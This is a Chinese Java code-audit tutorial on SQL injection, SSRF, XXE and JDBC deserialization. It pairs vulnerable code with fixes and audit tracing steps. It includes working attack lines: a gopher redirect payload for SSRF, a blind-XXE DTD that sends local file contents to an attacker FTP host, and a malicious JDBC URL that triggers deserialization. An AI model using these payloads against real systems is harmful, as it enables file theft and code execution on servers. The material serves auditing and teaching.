---
title: Java代码审计--常见漏洞函数
date: 2023/11/1 15:00:25
categories:
- Java
tags:
- 代码审计
---



# Sql注入

## Java中的数据库操作

### JDBC

#### 数据库连接

原始

```java
String CLASS_NAME = "com.mysql.cj.jdbc.Driver";
//正确设置时区，否则会报错
String URL = "jdbc:mysql://localhost:3306/mybatis?characterEncoding=UTF-8&serverTimezone=UTC";
String USERNAME = "root";
String PASSWORD = "123";

Class.forName(CLASS_NAME);// 注册JDBC驱动类
Connection con = DriverManager.getConnection(URL, USERNAME, PASSWORD);
```

Datasource

> 使用Java程序访问数据库时，Java 代码并不是直接通过 TCP 连接去访问数据库，而是通过 JDBC 接口来访问，而 JDBC 接口则通过 JDBC 驱动来实现真正对数据库的访问。
>
> 连接池类似于线程池，在一些情况下我们会频繁地操作数据库，此时Java在连接数据库时会频繁地创建或销毁句柄，增大资源的消耗。为了避免这样一种情况，我们可以提前创建好一些连接句柄，需要使用时直接使用句柄，不需要时可将其放回连接池中，准备下一次的使用。类似这样一种能够复用句柄的技术就是池技术。

```properties
spring.datasource.url=jdbc:mysql://localhost:3306/mybatis?serverTimezone=UTC&useUnicode=true&characterEncoding=utf-8&useSSL=true
spring.datasource.username=root
spring.datasource.password=123
spring.datasource.type=com.alibaba.druid.pool.DruidDataSource
spring.datasource.driver-class-name=com.mysql.jdbc.Driver
```



#### 查询函数

##### statement.executeQuery()

```java
String sql = "select * from user where name = '" + username + "'";
ResultSet rs = statement.executeQuery(sql);
```

![image-20231020230554466](../../../images/image-20231020230554466.png)



##### PreparedStatement

PrepareStatement会对SQL语句进行**预编译**

传参`'admin`'

![image-20230330172741664](../../../images/image-20230330172741664.png)

预编译会对传入的参数自动**加上一对单引号**，并对参数值进行**转义操作**

#### 预编译使用

- 单个参数

  ```java
  String sql="select * from user where name=?";
  PreparedStatement statement = con.prepareStatement(sql);
  statement.setString(1,username);
  ResultSet rs = statement.executeQuery();
  ```

- in语句

  在in当中使用拼接而不使用占位符做预编译的原因是因为很多时候无法确定范围里含有多少个对象

  ```java
  public int gradeDelete(Connection con, String delIds) throws Exception{
      String num = "";
      //将对象分割开来,根据实际传参情况进行分割
      String[] spl = delIds.split(".");
  
      //根据对象的个数添加同量的占位符?,用来预编译
      for(int i = 0; i< spl.length; i++){
          if(i == 0){
              num += "?";
          } else {
              num += ".?";
          }
      }
      
      String sql = "delete from users where id in("+num+")";
      prepareStatement pstmt = con.prepareStatement(sql);
      try {
          for(int j = 0; j < spl.length; j++){
              pstmt.setInt(j+1, integer.parseint(spl[j]));
          }
          return pstmt.executeUpdate();
      } catch(Exception e){
          //
      }
  
      return 0;
  }
  ```

- like语句

  **正确的写法**

  ```java
  String sql = "select * from users like ?";
  PreparedStatement statement = con.prepareStatement(sql);
  statement.setString("txf","%"+username+"%");
  ResultSet rs = statement.executeQuery();
  
  或者
      
  String sql = "select * from users like concat('%',?,'%')";
  PreparedStatement statement = con.prepareStatement(sql);
  statement.setString("txf",username);
  ResultSet rs = statement.executeQuery();
  ```

  ![image-20231021103743908](../../images/image-20231021103743908.png)

  **错误的写法**

  ```java
  String sql = "select * from users like %?%";
  PreparedStatement statement = con.prepareStatement(sql);
  statement.setString(1,username);
  ResultSet rs = statement.executeQuery();
  ```

  ![image-20231021103421175](../../images/image-20231021103421175.png)

当然对于`order by`这种使用了预编译会导致Sql语句失效的地方，还是需要手动写黑白名单的过滤才可以。



### Hibernate框架

> Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，使得Java程序员可以随心所欲的使用对象编程思维来操纵数据库。
>
> Hibernate可以使用hql来执行SQL语句，也可以直接执行SQL语句，无论是哪种方式都有可能导致SQL注入

#### Sql查询

**HQL语句**

```java
String hql = "from People where username = '" + username + "' and password = '" + password + "'";
Query query = session.createQuery(hql);
List list = query.list();
System.out.println(list);
```

**Sql语句**

```java
Query<People> query = session.createNativeQuery("select * from user where username = '" + username + "' and password = '" + password + "'");
```



#### 预编译使用

##### 命名参数（named parameter)

```java
Query<User> query = session.createQuery("from users name = :name", User.class);
query.setParameter("name", parameter);
```

##### 位置参数（Positional parameter）

```java
Query<User> query = session.createQuery("from users name = ?", User.class);
query.setParameter(0, parameter);
```

##### 命名参数列表（named parameter list）

```java
List<String> names = Arrays.asList("111", "222");
Query<User> query = session.createQuery("from users where name in (:names)", User.class);
query.setParameter("names", names);
```

##### 类实例（JavaBean）

```java
user1.setName("khaz");
Query<User> query = session.createQuery("from users where name =:name", User.class);
query.setProperties(user1);
```





### Mybatis框架

> MyBatis 是一款优秀的持久层框架，它支持自定义 SQL、存储过程以及高级映射。MyBatis 免除了几乎所有的 JDBC 代码以及设置参数和获取结果集的工作。MyBatis 可以通过简单的 XML 或注解来配置和映射原始类型、接口和 Java POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。

#### 使用

##### 基于注解

`dao`

```java
@Mapper
public interface UserMapper {
    @Select("select * from user")
    public List<User> findAll();
}
```

> 要么在每一个`dao`上加上`@Mapper`，或者不加然后在启动类加上`@MapperScan("dao所在的包")`

`entity`

```java
public class User {
    private int id;
    private String name;
    private String pwd;
}
```

`Controller`

```java
@RestController
@RequestMapping(value = "/mybatis")
public class SqlDemo {
    @Autowired
    private UserMapper userMapper;

    @RequestMapping(value = "/sql")
    public List<User> mybatisVuln01(@RequestParam("username") String username) {
        return userMapper.queryByName(username);
    }
}
```



##### 基于XML

主要区别在于sql语句一个是写在Mapper注解，一个是写在XML中

`mapper`

```xml
<!-- namespace值为dao -->
<mapper namespace="com.itheima.springbootmybatis.mapper.UserXmlMapper">
    <!-- id对应接口方法名 resultType对应实体 -->
    <select id="findAll" resultType="user">
        select * from user
    </select>
</mapper>
```

`dao`

```java
@Mapper
@Repository
public interface UserXmlMapper {
    public List<User> findAll();
}
```

映射关系

```yaml
mybatis:
  mapper-locations: classpath:mapper/*Mapper.xml # mapper映射文件路径
  type-aliases-package: com.itheima.springbootmybatis.domain
```

`entity`

```java
public class User {
    private int id;
    private String name;
    private String pwd;
}
```

`Controller`

```java
@RestController
@RequestMapping(value = "/mybatis")
public class SqlDemo {
    @Autowired
    private UserMapper userMapper;

    @RequestMapping(value = "/sql")
    public List<User> mybatisVuln01(@RequestParam("username") String username) {
        return userMapper.queryByName(username);
    }
}
```



#### 传参方式

Mybatis下有两种传参方式，分别是`${}`以及`#{}`

##### `${}`传参

使用`${}`的方式传参，mybatis是将传入的参数**直接拼接**到SQL语句上

Mapper

```java
@Select("select * from user where name = '${username}'")
public List<User> queryByName(String username);
```

Controller

```java
@RequestMapping(value = "/sql")    
public List<User> mybatisVuln01(@RequestParam("username") String username) {        
	return userMapper.queryByName(username);    
}
```

![image-20231021133037285](../../images/image-20231021133037285.png)



##### `#{}`传参

使用`#{}`传参则相当于使用了预编译，相当于`?`占位符

Mapper

```java
@Select("select * from user where name = #{username}")
public List<User> queryByName(String username);
```

![image-20231021134416037](../../images/image-20231021134416037.png)

![image-20231021134353209](../../images/image-20231021134353209.png)



## 总结

**可能存在的sql注入点**

DAO: 存在拼接的SQL语句

```
String sql="select * from user where id="+id
```

Hibernate框架

```
session.createQuery("from Book where title like '%" + userInput + "%' and published = true")
```

Mybatis框架

```java
Select * from news where title like concat("%"+"${title}"+"%")
Select * from news where id in (${id})，
Select * from news where title ='java' order by ${time} asc
```

⚠️ 注意并不是全部的参数拼接都会产生漏洞的，有以下几种情况是不存在SQL注入的：

- param不可控

- param不是字符类型，比如说parameter为int类型，只能传入数字，就没法产生SQL注入

- param在传递过程中被转义或过滤，比如filter过滤器

**修复**

- 正确使用预编译,如占位符问题，Mybatis框架使用`#{}`
- 不能预编译的地方如Order By，可以加filter来进行黑名单过滤





## Spring Boot项目挖掘

### 观察项目使用了哪一种方法来操作数据库

从`POM.XML`中可以看到使用了Mybatis框架

![image-20231026154200895](../../images/image-20231026154200895.png)

### 搜索相关关键词，找到可能存在的点

如Mybatis框架就搜索`${`，可以看到这里因为是like模糊查询所以使用了`${}`来进行拼接

![image-20231026154322869](../../images/image-20231026154322869.png)

### 逆向追踪拼接的参数传入过程，逆向追踪参数的路径大致为`Mapper -> Dao -> ServiceImpl -> Controller`

搜索得到有两处查询使用了`${}`来进行拼接

![image-20231026160243330](../../images/image-20231026160243330.png)

![image-20231026160308494](../../images/image-20231026160308494.png)

通过`namespace`可以找到对应的`Dao`

![image-20231026160357396](../../images/image-20231026160357396.png)

在`Dao`中找到对应方法，

![image-20231026160600815](../../images/image-20231026160600815.png)

`find usages`跳转到对应实现

![image-20231026160811957](../../images/image-20231026160811957.png)

再次追踪该方法调用，来到`Crontroller`层

![image-20231026160856177](../../images/image-20231026160856177.png)

所属类

![image-20231026161030565](../../images/image-20231026161030565.png)

所以有如下请求

```http
/admin/goods/list?page=xx&limit=xx&goodsName=
```

使用sqlmap验证

![image-20231026171348504](../../images/image-20231026171348504.png)

另一处也是如此分析

![image-20231026171528715](../../images/image-20231026171528715.png)

### 总结

本次较为简单，因为没有过滤的存在，主要是学习如何寻找以及数据的流向。

那么对于SQL注入的审计，如Mybatis框架先在Mapper中搜寻是否存在`${}`拼接的情况，尤其注意order by、group by、like、in。找到拼接后再逆向追踪参数，判断参数是否可控，是否是字符类型，检查是否存在过滤器过滤SQL字符。



# SSRF

## 相关函数

带HTTP开头，只支持HTTP、HTTPS协议的

```java
String url = request.getParameter("url");
URL u = new URL(url);

// HttpURLConnection
HttpURLConnection httpURLConnection = (HttpURLConnection)urlConnection;
// OkHttpClient
OkHttpClient client = new OkHttpClient();
com.squareup.okhttp.Request ok_http = new com.squareup.okhttp.Request.Builder().url(u).build();
client.newCall(ok_http).execute(); 
// HttpClients
CloseableHttpClient client = HttpClients.createDefault();
HttpGet httpGet = new HttpGet(u);
HttpResponse httpResponse = client.execute(httpGet); 
```

支持`sun.net.www.protocol`所有协议的

```java
//openStream
InputStream inputStream = u.openStream();

//URLConnection
URLConnection urlConnection = u.openConnection();
```

其他

```java
// ImageIO，如果获取到的不是图片，会返回null
BufferedImage img = ImageIO.read(u);
```







## java自身对ssrf的限制

### 支持的协议

JDK1.8如下图

![image-20231029170703568](../../images/image-20231029170703568.png)

![image-20231029212848423](../../images/image-20231029212848423.png)

低版本的JDK1.7是支持gopher协议的

### DNS Rebinding限制

Java应用的默认TTL为10s，这个默认配置会导致DNS Rebinding绕过失败。也就是说，默认情况下，Java应用不受DNS Rebinding影响。

### 302跳转限制

java默认会URL重定向。

```java
<?php
$url = 'gopher://35.185.163.134:2333/_joy%0achou';
header("location: $url");
?>
```

访问payload

```java
http://localhost:8080/download?url=http://joychou.me/302.php
```

收到异常：

```java
java.net.MalformedURLException: unknown protocol: gopher
```

跟踪报错代码：

```java
private boolean followRedirect() throws IOException {
        if(!this.getInstanceFollowRedirects()) {
            return false;
        } else {
            final int var1 = this.getResponseCode();
            if(var1 >= 300 && var1 <= 307 && var1 != 306 && var1 != 304) {
                final String var2 = this.getHeaderField("Location");
                if(var2 == null) {
                    return false;
                } else {
                    URL var3;
                    try {
                        // 该行代码发生异常，var2变量值为`gopher://35.185.163.134:2333/_joy%0achou`
                        var3 = new URL(var2);
                        /* 该行代码，表示传入的协议必须和重定向的协议一致
                         * 即http://joychou.me/302.php的协议必须和gopher://35.185.163.134:2333/_joy%0achou一致
                         */
                        if(!this.url.getProtocol().equalsIgnoreCase(var3.getProtocol())) {
                            return false;
                        }
                    } catch (MalformedURLException var8) {
                        var3 = new URL(this.url, var2);
                    }
```

从上面的followRedirect方法可以看到：

- 实际跳转的url也在限制的协议内
- 传入的url协议必须和重定向的url协议一致



## Java中的file协议Trick

Java的file协议有一个trick，如果file协议的路径是目录就会列出该目录下的所有文件

![image-20231029160825071](../../images/image-20231029160825071.png)

```java
file:///跟file:/是一样的
```



## 修复方案

1. 解析目标URL

   获取scheme、host（推荐使用系统内置函数完成,避免自己使用正则提取）

2. 校验scheme

   检查 scheme 是否为合法 (如非特殊需求请只允许 http 和 https)

3. 获取解析IP

   解析 host 获取 dns 解析后的 IP 地址

4. 检测IP是否合法

   检查解析后的IP地址是否为外网地址或者合法IP（转换为统一格式的IP来判断）

5. 请求URL

   - 先检验URL对应的IP是否合法，再发包
   - 如果有重定向，回到步骤1，并且设置最大重定向次数

   

关于DNS Rebinding的修复

- 如果请求的域名是在一定范围内的，比如说存储桶静态文件，可以设定域名白名单
- 请求url时，不使用域名访问，而是先获得对应的IP，对IP进行判断后，再请求该IP



# XXE

## 相关函数

### xmlReader

漏洞代码

```java
XMLReader xmlReader = XMLReaderFactory.createXMLReader();
xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml
```

修复

```java
XMLReader xmlReader = XMLReaderFactory.createXMLReader();
// fix code start
xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
xmlReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
xmlReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
//fix code end
xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml
```



### SAXBuilder

漏洞代码

```java
SAXBuilder builder = new SAXBuilder();
// org.jdom2.Document document
builder.build(new InputSource(new StringReader(body)));  // cause xxe
```

修复

```java
SAXBuilder builder = new SAXBuilder();
builder.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
builder.setFeature("http://xml.org/sax/features/external-general-entities", false);
builder.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
// org.jdom2.Document document
builder.build(new InputSource(new StringReader(body)));
```



### SAXReader

漏洞代码

```java
SAXReader reader = new SAXReader();
// org.dom4j.Document document
reader.read(new InputSource(new StringReader(body))); // cause xxe
```

修复

```java
SAXReader reader = new SAXReader();
reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
reader.setFeature("http://xml.org/sax/features/external-general-entities", false);
reader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
// org.dom4j.Document document
reader.read(new InputSource(new StringReader(body)));
```



### SAXParser

漏洞代码

```java
SAXParserFactory spf = SAXParserFactory.newInstance();
SAXParser parser = spf.newSAXParser();
parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml
```

修复

```java
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
SAXParser parser = spf.newSAXParser();
parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml
```



### Digester

漏洞代码

```java
Digester digester = new Digester();
digester.parse(new StringReader(body));  // parse xml
```

修复

```java
Digester digester = new Digester();
digester.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
digester.setFeature("http://xml.org/sax/features/external-general-entities", false);
digester.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
digester.parse(new StringReader(body));  // parse xml
```



### DocumentBuilder--普通

漏洞代码

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
InputSource is = new InputSource(request.getInputStream());
Document document = db.parse(is);  // parse xml
```

修复

```java
 DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
 dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
 dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
 dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
 DocumentBuilder db = dbf.newDocumentBuilder();
 StringReader sr = new StringReader(body);
 InputSource is = new InputSource(sr);
 db.parse(is);  // parse xml
```





### DocumentBuilder--Xinclude

漏洞代码

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setXIncludeAware(true);   // 支持XInclude
dbf.setNamespaceAware(true);  // 支持XInclude
DocumentBuilder db = dbf.newDocumentBuilder();
StringReader sr = new StringReader(body);
InputSource is = new InputSource(sr);
Document document = db.parse(is);  // parse xml
```

![image-20231031215534242](../../images/image-20231031215534242.png)

![image-20231031215541894](../../images/image-20231031215541894.png)

修复

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setXIncludeAware(true);   // 支持XInclude
dbf.setNamespaceAware(true);  // 支持XInclude

dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

DocumentBuilder db = dbf.newDocumentBuilder();
StringReader sr = new StringReader(body);
InputSource is = new InputSource(sr);
Document document = db.parse(is);  // parse xml
```



### XMLReader

漏洞代码

```java
SAXParserFactory spf = SAXParserFactory.newInstance();
SAXParser saxParser = spf.newSAXParser();
XMLReader xmlReader = saxParser.getXMLReader();
xmlReader.parse(new InputSource(new StringReader(body)));
```

修复

```java
SAXParserFactory spf = SAXParserFactory.newInstance();
SAXParser saxParser = spf.newSAXParser();
XMLReader xmlReader = saxParser.getXMLReader();
xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
xmlReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
xmlReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
xmlReader.parse(new InputSource(new StringReader(body)));
```



### DocumentHelper

漏洞代码

```java
DocumentHelper.parseText(body);
```

修复

升级dom4j到2.1.1及以上，该版本及以上禁用了ENTITY



### XMLBeam

Spring Data Commons 1.13至1.13.11以及2.0至2.0.6的版本在与XMLBeam1.4.14或更早的版本进行结合使用时，XMLBeam不会限制XML外部实体应用

CVE-2018-1259复现

![image-20231031220633539](../../images/image-20231031220633539.png)

漏洞代码

```java
@ProjectedPayload
        public interface UserPayload {
            @XBRead("//userName")
            String getUserName();
        }
        
return ResponseEntity.ok(String.format("hello, %s!", user.getUserName()))
```

![image-20231031220844578](../../images/image-20231031220844578.png)

![image-20231031220832355](../../images/image-20231031220832355.png)



修复

升级版本



## 相关协议

### file://和netdoc://

#### 读取文件

file://

![image-20231101213505089](../../images/image-20231101213505089.png)

netdoc://

![image-20231101213722597](../../images/image-20231101213722597.png)

#### 列目录

file://

![image-20231101213537762](../../images/image-20231101213537762.png)

netdoc://

![image-20231101213612530](../../images/image-20231101213612530.png)



### ftp://--数据外带

工具：

[TheTwitchy/xxer: A blind XXE injection callback handler. Uses HTTP and FTP to extract information. Originally written in Ruby by ONsec-Lab. (github.com)](https://github.com/TheTwitchy/xxer)

```bash
python2 .\xxer.py -p 1234 -H 192.168.23.108
```

> -p是指定http_server的端口，ftp_server默认端口为2121

![image-20231101221119855](../../images/image-20231101221119855.png)

启动后生成的恶意DTD为

```dtd
<!ENTITY % bbb SYSTEM "file:///tmp/"><!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'ftp://fakeuser:%bbb;@192.168.23.108:2121/b'>">
```

发送payload

![image-20231101221543104](../../images/image-20231101221543104.png)

查看ftp日志，得到外带数据

![image-20231101221612694](../../images/image-20231101221612694.png)

注意点：

- jdk版本 小于 7u141 和 小于 8u162 才可以读取整个文件

- 有特定字符时无法读取

  我这里是JDK8u371，文件中含有`' & % / #`时无法读取

- 别人的测试结果

  ![image-20231101222129702](../../images/image-20231101222129702.png)



### jar://

[一篇文章带你理解漏洞之 XXE 漏洞 | K0rz3n's Blog](https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解 XXE 漏洞/#实验六：文件上传)



# 反序列化

## jdbc反序列化

> JDBC(Java Database Connectivity)是Java提供对数据库进行连接、操作的标准API。Java自身并不会去实现对数据库的连接、查询、更新等操作而是通过抽象出数据库操作的API接口(JDBC)，不同的数据库提供商必须实现JDBC定义的接口从而也就实现了对数据库的一系列操作。
>
> jdbc反序列化指在通过JDBC连接MySQL服务端时，会有几句内置的查询语句需执行，其中两个查询的结果集在MySQL客户端进行处理时会被`ObjectInputStream.readObject()`进行反序列化处理。如果攻击者可以控制JDBC连接设置项，那么可以通过设置其配置指向恶意MySQL服务触发MySQL JDBC客户端的反序列化漏洞

```java
jdbc:mysql://xxx.xxx.xxx.xxx:3306/test?"+"autoDeserialize=true"+"&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```

- 将 JDBC 连接地址指向攻击者事先准备好的恶意服务器，这个服务器可以返回恶意的序列化数据。
- 指定 autoDeserialize 参数为 true，mysql 客户端就可以自动反序列化恶意 payload。
- 使用 ServerStatusDiffInterceptor 触发客户端和服务端的交互和反序列化。



```
Shiro
Weblogic
Log4j
fastjson
rmi
jndi
jdbc
```

